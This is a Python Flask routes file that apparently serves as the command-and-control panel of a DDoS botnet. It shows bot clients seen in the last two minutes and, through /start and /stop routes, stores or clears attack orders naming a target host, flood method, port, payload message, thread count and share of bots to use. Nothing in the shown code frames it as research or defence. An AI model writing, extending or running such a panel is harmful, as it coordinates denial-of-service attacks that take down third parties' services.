import time

from flask import render_template, request, jsonify

from app import app, db
from models import Attack, User


@app.route('/', methods=['GET', 'POST'])
def index():
    users = User.query.all()
    last_seen_max = time.time() - 2 * 60
    return render_template('index.html', users=users,
                           last_seen_max=last_seen_max)


@app.route('/start', methods=['GET', 'POST'])
def start():
    users = User.query.all()
    last_seen_max = time.time() - 2 * 60

    attack = Attack.query.all()
    for i in attack:
        db.session.delete(i)
    db.session.commit()

    if request.form.get('stop_') == '1':
        return render_template('index.html', users=users,
                               last_seen_max=last_seen_max)

    host = request.form.get('host_')
    method = request.form.get('method_')
    smart = request.form.get('smart_')
    timeout = request.form.get('timeout_', '')
    msg_tcp_udp = request.form.get('msg_tcp_udp_')
    port = request.form.get('port_')
    max_thread = request.form.get('max_thread_', '')
    percent = request.form.get('percent_', '')

    smart = smart == 'true'

    attack = Attack(host=host, method=method, timeout=timeout, smart=smart,
                    msg_tcp_udp=msg_tcp_udp, port=port, max_thread=max_thread,
                    percent=percent)
    db.session.add(attack)
    db.session.commit()
    return render_template('index.html',
                           host=host,
                           method=method,
                           timeout=timeout,
                           smart=smart,
                           msg_tcp_udp=msg_tcp_udp,
                           port=port,
                           max_thread=max_thread,
                           percent=percent,
                           users=users,
                           last_seen_max=last_seen_max)


@app.route('/stop', methods=['GET', 'POST'])
def stop():
    users = User.query.all()
    last_seen_max = time.time() - 2 * 60
    attack = Attack.query.all()
    for i in attack:
        db.session.delete(i)
    db.session.commit()
    return render_template('index.html', users=users,
                           last_seen_max=last_seen_max)
